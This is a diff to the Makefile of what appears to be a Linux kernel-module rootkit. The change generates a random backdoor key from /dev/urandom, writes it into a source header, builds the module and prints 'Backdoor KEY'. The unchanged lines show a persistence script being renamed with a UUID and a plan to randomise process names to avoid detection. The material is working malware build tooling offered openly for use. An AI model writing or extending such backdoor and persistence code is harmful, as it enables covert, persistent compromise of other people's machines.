@@ -11,6 +11,7 @@ AS=$(shell which as)
 CTAGS=$(shell which ctags))
 JOURNALCTL := $(shell which journalctl)
 UUIDGEN := $(shell uuidgen)
+BDKEY := $(shell echo "0x$$(od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')")
 
 # TODO: Check if we can generate a random PROCNAME, something like:
 # PROCNAME ?= $(shell uuidgen | cut -c1-8)
@@ -44,7 +45,10 @@ obj-m := ${OBJNAME}.o
 CC=gcc
 
 all: persist
+	sed -i 's/^#define BDKEY .*/#define BDKEY $(BDKEY)/' src/bdkey.h
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+	@echo -n "Backdoor KEY: "
+	@echo $(BDKEY) | sed 's/^0x//'
 
 persist:
 	sed -i "s|.lm.sh|${UUIDGEN}.sh|g" $(persist).S
